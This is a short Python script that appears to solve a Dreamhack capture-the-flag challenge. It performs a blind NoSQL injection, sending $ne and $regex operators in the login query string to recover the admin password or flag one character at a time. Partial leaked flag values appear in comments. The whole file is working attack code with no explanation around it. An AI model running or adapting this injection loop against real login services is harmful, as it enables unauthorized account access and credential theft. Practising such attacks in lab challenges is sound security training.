import httpx
from time import sleep

url = "http://host3.dreamhack.games:14908/login?uid[$ne]=guest&upw[$regex]={3.*"


def ascii_list() -> list[str]:
    # li = []
    # for i in range(0x30, 0x39):
    #     li.append(chr(i))
    # for i in range(0x41, 0x5a):
    #     li.append(chr(i))
    # for i in range(0x61, 0x7a):
    #     li.append(chr(i))

    # li = list("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
    li = list("0123456789abcdefghijklmnopqrstuvwxyz")
    li.reverse()
    return li


def attempt(known: str) -> str:
    for c in ascii_list():
        sleep(0.1)
        print(c, end="", flush=True)
        url = (
            "http://host3.dreamhack.games:14329/login?uid[$ne]=guest&upw[$regex]="
            + c
            + known
            + "}$"
        )
        # url = (
        #     "http://host3.dreamhack.games:13351/login?uid[$ne]=guest&upw[$regex]=.*"
        #     + known
        #     + c
        #     + ".*"
        # )
        resp = httpx.get(url=url, timeout=5)
        if "admin" in resp.text:
            print("")
            return c
    print("nothing")
    exit()


def main():
    # known = "DH{fe2604e33c0ba05843d3df}"
    # known = "fe2604e33c0ba05843d3df"
    # known = "fe2604e33c0ba05843d3df"

    known = "9e50fa6fafe2604e33c0ba05843d3df"

    while True:
        known = attempt(known) + known
        # known += attempt(known)
        print(f"leaked: {known} ({len(known)})")


main()
